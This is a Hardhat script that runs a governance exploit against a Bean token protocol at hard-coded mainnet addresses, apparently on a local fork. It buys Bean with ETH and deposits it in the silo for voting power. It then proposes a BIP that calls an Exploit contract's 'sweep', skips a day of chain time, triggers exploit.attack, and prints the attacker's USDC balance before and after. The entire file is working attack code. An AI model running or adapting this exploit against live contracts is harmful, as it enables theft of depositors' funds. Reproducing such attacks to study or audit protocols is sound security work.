import hre from "hardhat"
import {
    Exploit__factory,
    IERC20__factory,
    IGovernanceFacet__factory,
    ISiloFacet__factory,
    IUniswapV2Router__factory
} from "../typechain";
import {parseEther} from "ethers/lib/utils";
import {constants} from "ethers";

async function main() {
    const [signer] = await hre.ethers.getSigners();
    const usdc = IERC20__factory.connect("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",signer);
    const bean = IERC20__factory.connect("0xDC59ac4FeFa32293A95889Dc396682858d52e5Db",signer);
    const govFacet = IGovernanceFacet__factory.connect("0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5",signer);
    const siloFacet = ISiloFacet__factory.connect("0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5",signer);
    const uniswapRouter = IUniswapV2Router__factory.connect("0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",signer);
    const exploit = await new Exploit__factory(signer).deploy();

    await uniswapRouter.swapExactETHForTokens(0, [await uniswapRouter.WETH(), bean.address], signer.address, Math.round(+new Date() / 1000) + 120, {value: parseEther("73")});
    await bean.approve(siloFacet.address,constants.MaxUint256);
    await siloFacet.depositBeans(await bean.balanceOf(signer.address));
    await govFacet.propose([],exploit.address,exploit.interface.encodeFunctionData("sweep"),3)
    await hre.ethers.provider.send('evm_increaseTime', [24 * 60 * 60]);
    const bip = await govFacet.numberOfBips()-1

    console.log("USDC balance of attacker:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
    console.log("Exploiting...")
    await exploit.attack(bip);
    console.log("Exploit complete.")
    console.log("USDC balance of attacker:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});